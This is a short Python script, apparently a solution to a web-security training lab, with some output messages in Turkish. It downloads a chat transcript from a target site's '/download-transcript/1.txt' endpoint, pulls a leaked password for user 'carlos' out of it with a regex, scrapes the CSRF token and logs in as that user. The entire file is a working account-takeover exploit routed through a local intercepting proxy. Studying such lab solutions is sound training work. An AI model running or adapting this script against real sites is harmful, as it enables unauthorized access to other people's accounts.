import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }



def carlos_password_al(s, url):
    chat_url = url +"/download-transcript/1.txt"
    r = s.get(chat_url, verify=False, proxies=proxies)
    res = r.text
    if 'password' in res:
        print("[+] Password var")
        carlos_password = re.findall(r'password is (.*)\.' , res)
        return carlos_password[0]
    else:
        print("[+] Password yok")
        sys.exit(-1)




def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf



def carlos_login(s, url, password):
     login_url = url+"/login"
     csrf_token = get_csrf_token(s,login_url)
     print("(+) Login carlos")
     data = {"csrf": csrf_token,
            "username": "carlos",
            "password": password}
    
     r = s.post(login_url, data=data, verify=False, proxies=proxies)
     res = r.text
     if "Log out" in res:
        print("[+] Giriş okey")
     else:
        print("[+] Giriş yok")
        sys.exit(-1)


if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
  
    s = requests.Session()
    url = sys.argv[1]
    carlos_pass = carlos_password_al(s, url)
    print("[+] Admin panel arıyorum.......")
    carlos_login(s, url, carlos_pass)


